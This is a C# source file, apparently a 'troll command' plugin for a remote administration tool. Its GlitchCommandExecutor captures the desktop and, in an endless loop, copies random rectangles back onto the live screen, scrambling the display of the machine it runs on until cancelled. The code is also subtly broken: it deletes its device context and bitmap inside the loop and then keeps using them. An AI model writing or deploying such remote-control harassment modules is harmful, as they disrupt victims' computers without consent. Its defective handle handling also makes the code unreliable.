using System;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Tasks.Infrastructure.Client.Library;
using TrollCommands.Client.Utilities;
using TrollCommands.Shared.Commands;

namespace TrollCommands.Client.Commands
{
    public class GlitchCommandExecutor : ITaskExecutor<GlitchCommandInfo>
    {
        public async Task<HttpResponseMessage> InvokeAsync(GlitchCommandInfo commandInfo, TaskExecutionContext context,
            CancellationToken cancellationToken)
        {
            var random = new Random();
            ScreenUtils.Initialize(out var hwnd, out var hdc, out var rect);

            if (commandInfo.MaxSize >= rect.Width)
                commandInfo.MaxSize = rect.Width - 1;
            if (commandInfo.MaxSize >= rect.Height)
                commandInfo.MaxSize = rect.Height - 1;

            try
            {
                var screenshot = ScreenUtils.CreateCompatibleBitmap(hdc, rect.Width, rect.Height);
                var hdc2 = ScreenUtils.CreateCompatibleDC(hdc);
                ScreenUtils.SelectObject(hdc2, screenshot);

                while (true)
                {
                    ScreenUtils.BitBlt(hdc2, 0, 0, rect.Width, rect.Height, hdc, 0, 0, ScreenUtils.TernaryRasterOperations.SRCCOPY);

                    for (var i = 0; i < commandInfo.Power; i++)
                    {
                        var width = random.Next(0, commandInfo.MaxSize + 1);
                        var height = random.Next(0, commandInfo.MaxSize + 1);

                        var x1 = random.Next(0, rect.Width - width + 1);
                        var y1 = random.Next(0, rect.Height - height + 1);
                        var x2 = random.Next(0, rect.Width - width + 1);
                        var y2 = random.Next(0, rect.Height - height + 1);

                        ScreenUtils.BitBlt(hdc2, x1, y1, width, height, hdc2, x2, y2, ScreenUtils.TernaryRasterOperations.SRCCOPY);
                    }

                    ScreenUtils.BitBlt(hdc, 0, 0, rect.Width, rect.Height, hdc2, 0, 0, ScreenUtils.TernaryRasterOperations.SRCCOPY);

                    ScreenUtils.DeleteDC(hdc2);
                    ScreenUtils.DeleteObject(screenshot);

                    await Task.Delay(commandInfo.Power, cancellationToken);
                }
            }
            finally
            {
                ScreenUtils.ReleaseDC(hwnd, hdc);
            }
        }
    }
}